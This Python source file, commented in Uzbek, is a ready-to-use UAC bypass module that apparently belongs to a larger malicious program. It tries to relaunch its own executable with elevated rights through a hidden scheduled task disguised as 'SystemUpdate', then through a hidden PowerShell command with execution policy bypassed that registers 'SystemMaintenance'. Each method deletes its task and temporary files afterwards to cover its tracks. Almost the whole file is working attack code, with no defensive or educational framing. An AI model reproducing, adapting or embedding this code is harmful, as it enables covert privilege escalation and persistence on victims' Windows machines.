# uac_bypass.py - v3.1.0 PRODUCTION SAFE (Path-Safe, Async)
"""
UAC Bypass - Xavfsiz va Async
TUZATILDI: Bo'sh joy bor yo'llar uchun qo'shtirnoq
"""

import asyncio
import os
import sys
import ctypes
import time
import logging
import tempfile
from pathlib import Path

logger = logging.getLogger(__name__)

def is_admin():
    """Admin huquqini tekshirish"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def is_user_in_admin_group():
    """Foydalanuvchi Administrators guruhida ekanligini tekshirish"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def check():
            proc = await asyncio.create_subprocess_exec(
                'net', 'user', os.environ.get('USERNAME', ''),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=asyncio.subprocess.CREATE_NO_WINDOW if hasattr(asyncio.subprocess, 'CREATE_NO_WINDOW') else 0
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode('cp866', errors='ignore')
            return 'Administrators' in output or 'Администраторы' in output
        
        result = loop.run_until_complete(check())
        loop.close()
        return result
    except Exception as e:
        logger.error(f"Admin guruhi tekshiruvi xatosi: {e}")
        return False

# ==================== TASK SCHEDULER (TUZATILGAN - PATH SAFE) ====================
async def bypass_uac_task_scheduler():
    """
    Task Scheduler UAC Bypass - Path-Safe
    TUZATILDI: Barcha yo'llar qo'shtirnoqda
    """
    try:
        logger.info("Task Scheduler UAC bypass boshlandi...")
        
        # Joriy .exe yo'lini olish
        if getattr(sys, 'frozen', False):
            current_exe = sys.executable
        else:
            logger.warning(".exe rejimida emas - UAC bypass o'tkazib yuborildi")
            return False
        
        # TUZATILDI: Noyob task nomi
        task_name = f"SystemUpdate_{int(time.time())}"
        
        # TUZATILDI: XML'da yo'lni qo'shtirnoqda o'rash
        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{time.strftime("%Y-%m-%dT%H:%M:%S")}</Date>
    <Author>{os.environ.get("USERNAME", "System")}</Author>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Enabled>true</Enabled>
      <StartBoundary>{time.strftime("%Y-%m-%dT%H:%M:%S")}</StartBoundary>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{os.environ.get("USERNAME", "System")}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{current_exe}"</Command>
    </Exec>
  </Actions>
</Task>'''
        
        # XML faylni temp papkaga yozish
        temp_xml = Path(tempfile.gettempdir()) / f"{task_name}.xml"
        
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, temp_xml.write_text, task_xml, 'utf-16')
        
        logger.info(f"Task XML yaratildi: {temp_xml}")
        
        # TUZATILDI: Task yaratish (yo'lni qo'shtirnoqda)
        proc = await asyncio.create_subprocess_exec(
            'schtasks.exe', '/Create', '/TN', task_name, '/XML', f'"{temp_xml}"', '/F',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=asyncio.subprocess.CREATE_NO_WINDOW if hasattr(asyncio.subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        stdout, stderr = await proc.communicate()
        
        if proc.returncode != 0:
            logger.error(f"Task yaratish xatosi: {stderr.decode()}")
            await loop.run_in_executor(None, temp_xml.unlink, True)
            return False
        
        logger.info("Task muvaffaqiyatli yaratildi")
        
        # Task'ni ishga tushirish
        proc2 = await asyncio.create_subprocess_exec(
            'schtasks.exe', '/Run', '/TN', task_name,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=asyncio.subprocess.CREATE_NO_WINDOW if hasattr(asyncio.subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        await proc2.communicate()
        
        logger.info("Task admin huquqlari bilan ishga tushirildi")
        
        # Tozalash
        await asyncio.sleep(3)
        
        # Task'ni o'chirish
        proc3 = await asyncio.create_subprocess_exec(
            'schtasks.exe', '/Delete', '/TN', task_name, '/F',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=asyncio.subprocess.CREATE_NO_WINDOW if hasattr(asyncio.subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        await proc3.communicate()
        
        # XML'ni o'chirish
        await loop.run_in_executor(None, temp_xml.unlink, True)
        
        logger.info("UAC bypass tugadi - yangi admin instance boshlandi")
        
        # Joriy jarayondan chiqish
        await asyncio.sleep(1)
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Task Scheduler bypass xatosi: {e}")
        return False

# ==================== COM ELEVATION (TUZATILGAN) ====================
async def bypass_uac_com_elevation():
    """COM Elevation - Path-Safe"""
    try:
        logger.info("COM Elevation bypass boshlandi...")
        
        if getattr(sys, 'frozen', False):
            current_exe = sys.executable
        else:
            return False
        
        # TUZATILDI: PowerShell script'da yo'lni qo'shtirnoqda
        ps_script = f'''
$action = New-ScheduledTaskAction -Execute '"{current_exe}"'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest

Register-ScheduledTask -TaskName "SystemMaintenance" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
Start-ScheduledTask -TaskName "SystemMaintenance"
Start-Sleep -Seconds 3
Unregister-ScheduledTask -TaskName "SystemMaintenance" -Confirm:$false
'''
        
        # PowerShell'ni ishga tushirish
        proc = await asyncio.create_subprocess_exec(
            "powershell", "-WindowStyle", "Hidden", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            creationflags=asyncio.subprocess.CREATE_NO_WINDOW if hasattr(asyncio.subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
        except asyncio.TimeoutError:
            logger.error("COM Elevation vaqti tugadi")
            proc.kill()
            return False
        
        if "error" not in stderr.decode().lower():
            logger.info("COM Elevation muvaffaqiyatli")
            await asyncio.sleep(2)
            sys.exit(0)
        else:
            logger.error(f"COM Elevation xatosi: {stderr.decode()}")
            return False
            
    except Exception as e:
        logger.error(f"COM Elevation bypass xatosi: {e}")
        return False

# ==================== SMART UAC BYPASS ====================
async def smart_uac_bypass():
    """Aqlli UAC bypass - eng yaxshi usulni sinab ko'radi"""
    try:
        # Allaqachon admin?
        if is_admin():
            logger.info("Admin huquqlari allaqachon mavjud")
            return True
        
        # Admin guruhida emas?
        if not is_user_in_admin_group():
            logger.warning("Foydalanuvchi Administrators guruhida emas - bypass mumkin emas")
            return False
        
        logger.info("UAC bypass urinilmoqda...")
        
        # Usul 1: Task Scheduler (eng ishonchli)
        try:
            result = await bypass_uac_task_scheduler()
            if result:
                return True
        except Exception as e:
            logger.error(f"Task Scheduler usuli xatosi: {e}")
        
        # Usul 2: COM Elevation (zaxira)
        try:
            result = await bypass_uac_com_elevation()
            if result:
                return True
        except Exception as e:
            logger.error(f"COM Elevation usuli xatosi: {e}")
        
        logger.error("Barcha UAC bypass usullari ishlamadi")
        return False
        
    except Exception as e:
        logger.error(f"Smart UAC bypass xatosi: {e}")
        return False

# ==================== ASOSIY ASYNC FUNKSIYA ====================
async def attempt_uac_bypass():
    """
    Asosiy UAC bypass funksiyasi - to'liq async
    Har qanday async kontekstdan xavfsiz chaqirish mumkin
    """
    try:
        # Allaqachon admin ekanligini tekshirish
        if is_admin():
            return True
        
        # Bypass'ni sinab ko'rish
        return await smart_uac_bypass()
        
    except Exception as e:
        logger.error(f"UAC bypass urinishi xatosi: {e}")
        return False

# ==================== SYNC WRAPPER (Uyg'unliksizlik uchun) ====================
def attempt_uac_bypass_sync():
    """
    UAC bypass uchun sinxron o'rovchi
    Agar async bo'lmagan koddan chaqirsangiz, buni ishlating
    """
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(attempt_uac_bypass())
        loop.close()
        return result
    except Exception as e:
        logger.error(f"Sync UAC bypass xatosi: {e}")
        return False

# ==================== EXPORT ====================
__all__ = [
    'is_admin',
    'is_user_in_admin_group',
    'attempt_uac_bypass',
    'attempt_uac_bypass_sync',
]